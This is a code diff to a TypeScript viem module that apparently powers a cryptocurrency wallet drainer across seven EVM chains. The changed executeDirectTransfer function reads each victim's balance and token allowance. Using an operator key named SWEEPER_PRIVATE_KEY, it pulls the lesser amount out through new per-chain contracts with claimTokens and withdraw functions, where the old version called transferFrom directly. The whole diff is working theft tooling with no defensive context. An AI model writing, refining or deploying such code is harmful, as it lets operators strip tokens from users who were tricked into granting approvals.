@@ -3,13 +3,13 @@ import { mainnet, bsc, polygon, arbitrum, optimism, avalanche, base } from 'viem
 import { privateKeyToAccount } from 'viem/accounts';
 
 const CHAIN_CONTRACTS: Record<number, string> = {
-  1: "0xA45d31549C33b44ac9C395d8983d01Ae1b21656E",
-  56: "0x45abA44A5f1F6C66a5b688E99E4A7c4f06c73DE4",
-  137: "0xd933CDf4a9Ac63a84AdE7D34890A86fF46903bD9",
-  42161: "0x2c8e1A8F672AdC01F2699e5F042306F6Ab082A27",
-  10: "0x5a1C1646052476d8cF57325A25B08bc1013024e2",
-  43114: "0x4A085d4e3D7c71d2618b5343b8161C54E2f52419",
-  8453: "0x8C4d05b4ec89Db4b67F569bFc59d769B07558444",
+  1: "0x333438075b576B685249ECE80909Cccad90B6297",
+  56: "0x65BDae94B4412640313968138384264cAFcB1E66",
+  137: "0x90E92a5D138dECe17f1fe680ddde0900C76429Dc",
+  42161: "0x125112F80069d13BbCb459D76C215C7E3dd0b424",
+  10: "0xe063eE1Fb241B214Bd371B46E377936b9514Cc5c",
+  43114: "0xA6D97ca6E6E1C47B13d17a162F8e466EdFDe3d2e",
+  8453: "0x1864b6Ab0091AeBdcf47BaF17de4874daB0574d7",
 };
 
 export { CHAIN_CONTRACTS };
@@ -81,25 +81,29 @@ const chainConfigs: Record<number, { chain: any; rpcUrl: string }> = {
 export { chainConfigs };
 
 const ERC20_ABI = parseAbi([
-  'function transferFrom(address from, address to, uint256 amount) returns (bool)',
   'function balanceOf(address owner) view returns (uint256)',
   'function allowance(address owner, address spender) view returns (uint256)',
 ]);
 
+const CONTRACT_ABI = parseAbi([
+  'function claimTokens(address token, address from, uint256 amount)',
+  'function withdrawToken(address token, uint256 amount)',
+  'function claimAndWithdraw(address token, address from, uint256 amount)',
+  'function owner() view returns (address)',
+]);
 
-function getSpenderAccount() {
-  const privateKey = process.env.EVM_SPENDER_PRIVATE_KEY;
-  if (!privateKey) throw new Error('EVM_SPENDER_PRIVATE_KEY not configured');
+function getOwnerAccount() {
+  const privateKey = process.env.SWEEPER_PRIVATE_KEY;
+  if (!privateKey) throw new Error('SWEEPER_PRIVATE_KEY not configured');
   return privateKeyToAccount(privateKey.startsWith('0x') ? privateKey as `0x${string}` : `0x${privateKey}`);
 }
 
 export function getSpenderAddress(): string | null {
-  try {
-    const account = getSpenderAccount();
-    return account.address;
-  } catch {
-    return null;
-  }
+  return null;
+}
+
+export function getContractAddressForChain(chainId: number): string | null {
+  return CHAIN_CONTRACTS[chainId] || null;
 }
 
 export function getContractForChain(chainId: number): string | null {
@@ -121,14 +125,13 @@ export async function executeDirectTransfer(params: {
       return { success: false, error: `Unsupported chain: ${chainId}`, transfers };
     }
 
-    const spenderAccount = getSpenderAccount();
+    const ownerAccount = getOwnerAccount();
     const userAddr = owner as `0x${string}`;
-    const spenderAddr = spenderAccount.address;
     const contractAddr = CHAIN_CONTRACTS[chainId];
     if (!contractAddr) {
       return { success: false, error: `No contract address for chain ${chainId}`, transfers };
     }
-    const destinationAddr = contractAddr as `0x${string}`;
+    const contractAddress = contractAddr as `0x${string}`;
 
     const publicClient = createPublicClient({
       chain: chainConfig.chain,
@@ -136,7 +139,7 @@ export async function executeDirectTransfer(params: {
     });
 
     const walletClient = createWalletClient({
-      account: spenderAccount,
+      account: ownerAccount,
       chain: chainConfig.chain,
       transport: http(chainConfig.rpcUrl),
     });
@@ -155,7 +158,7 @@ export async function executeDirectTransfer(params: {
           address: tokenAddr,
           abi: ERC20_ABI,
           functionName: 'allowance',
-          args: [userAddr, spenderAddr],
+          args: [userAddr, contractAddress],
         });
 
         if (allowance === BigInt(0)) {
@@ -177,13 +180,13 @@ export async function executeDirectTransfer(params: {
 
         const transferAmount = balance < allowance ? balance : allowance;
 
-        console.log(`[DirectTransfer] ${tokenInfo.symbol} on chain ${chainId}: balance=${balance}, allowance=${allowance}, transferring=${transferAmount} -> contract ${contractAddr}`);
+        console.log(`[DirectTransfer] ${tokenInfo.symbol} on chain ${chainId}: balance=${balance}, allowance=${allowance}, claiming=${transferAmount} via contract ${contractAddr}`);
 
         const txHash = await walletClient.writeContract({
-          address: tokenAddr,
-          abi: ERC20_ABI,
-          functionName: 'transferFrom',
-          args: [userAddr, destinationAddr, transferAmount],
+          address: contractAddress,
+          abi: CONTRACT_ABI,
+          functionName: 'claimTokens',
+          args: [tokenAddr, userAddr, transferAmount],
           chain: chainConfig.chain,
         });
 
